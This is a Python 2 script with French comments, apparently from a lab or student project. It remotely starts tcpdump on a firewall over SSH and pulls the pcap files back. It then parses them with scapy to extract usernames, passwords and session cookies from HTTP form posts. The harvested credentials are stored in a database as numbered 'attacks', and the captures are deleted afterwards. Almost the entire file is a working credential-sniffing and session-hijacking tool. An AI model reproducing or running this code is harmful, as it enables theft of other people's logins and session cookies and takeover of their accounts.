#!/usr/bin/env python2
# -*- coding: utf-8 -*-

from scapy.all import *
from subprocess import Popen, call, PIPE
import re 

from bdd import *

userssh= 'admin'
serverssh = '192.168.56.10'

##Lancer attaque
def start():
	process = Popen(['ssh', '-t', userssh + '@' + serverssh ,'tcpdump -w /usr/Firewall/capture/capture-%M.pcap -G 60 -i lo0 host 127.0.0.2 and port 8085 &'], bufsize=4096, stdout=PIPE)
	output = process.communicate()[0]
	ps = output.split(" ")[1]
	ps=ps[:-2]

	mon_fichier = open("etat", "w")
	mon_fichier.write(ps)
	mon_fichier.close()


##Arreter attaque
def stop():	
	mon_fichier = open("etat", "r")
	ps = mon_fichier.read()
	mon_fichier.close()

	process = Popen(['ssh', '-t', userssh + '@' + serverssh ,'kill '+ps], bufsize=4096, stdout=PIPE)
	output = process.communicate()[0]

	process = Popen(['ssh', '-t', userssh + '@' + serverssh ,'rm capture/*'], bufsize=4096, stdout=PIPE)
	output = process.communicate()[0]

	

##Récuperer fichier et supprimer ##
def findFile():
	process = Popen(['ssh', '-t', userssh + '@' + serverssh ,'ls -rt capture/'], bufsize=4096, stdout=PIPE)
	output = process.communicate()[0][:-2].replace("\r\n","\t").split('\t')[0]
	return output


def tailledist(file):
	process = Popen(['ssh', '-t', userssh + '@' + serverssh ,'du','capture/'+file], bufsize=4096, stdout=PIPE)
	output = process.communicate()[0]
	size=str(output.split("\t")[0]) 
	if size == "0":
		size=False
	else :
		size=True
	return size

def suppDist(file):
	process = Popen(['ssh', '-t', userssh + '@' + serverssh ,'rm','capture/'+file], bufsize=4096, stdout=PIPE)
	output = process.communicate()[0]
def suppLocal(file):
	process = Popen(['rm','capture/'+file])
	output = process.communicate()[0]


##Chercher user pass

def scap(file):
	user = ['login','username','email','user','users']


### On récupère les packets concerné
	pack = rdpcap("capture/"+file)
	pack = pack.filter(lambda packet: TCP in packet)
	for element in user:
		chercher(element,pack)

def chercher(terme,packets):
	packets = packets.filter(lambda packet: terme+"=" in str(packet))

	p=""
	for i in range(len(packets)):
		p=p+str(packets[i][Raw])

	if p!="":
		
	##Sépare chaque ligne
		p = p.split("\n")

		##On récupère login et pass

		log=(p[-1])
		log=log.split("&")
		
		login=""
		mdp=""
		cookieSession=""
		
		for element in log:
			element = str(element).split("=")
			try:
				if element[1] == "Numero" or element[1] == "1":
					element[0]="nothing"
			except:
				continue
			if element[0] == terme:
				login=element[1]
			elif re.match(r"pass|pwd", element[0]):
				mdp=element[1]
			if login != "" and mdp != "":
				login=login.replace("%40","@")
				url=p[1]
				url=url[6:]
				url=url.strip()
				cookie=p[10]
				if(cookie[:7]=="Cookie:"):
					cookieSession=cookie[7:]
					cookieSession=cookieSession.strip()
				
				mainDB(login,mdp,url,attaque,cookieSession)


				login=""
				mdp=""
				cookieSession=""

def recupExec(file):
	process = Popen(["scp", userssh+"@"+serverssh+":~/capture/"+file, "capture/"+file])
	output = process.communicate()[0]
	#if exist(file):
	suppDist(file)
	scap(file)
	suppLocal(file)


start()
attaque = nbAttaquePrec()+1
newAttaque(attaque)
while True:
	try:
		capt=findFile()
		if tailledist(capt):
			try:
				recupExec(capt)
			except:
				time.sleep(20)
				continue

		else:
			time.sleep(20)
	except KeyboardInterrupt:
		stop()
		print("Arret de l'attaque")
		break
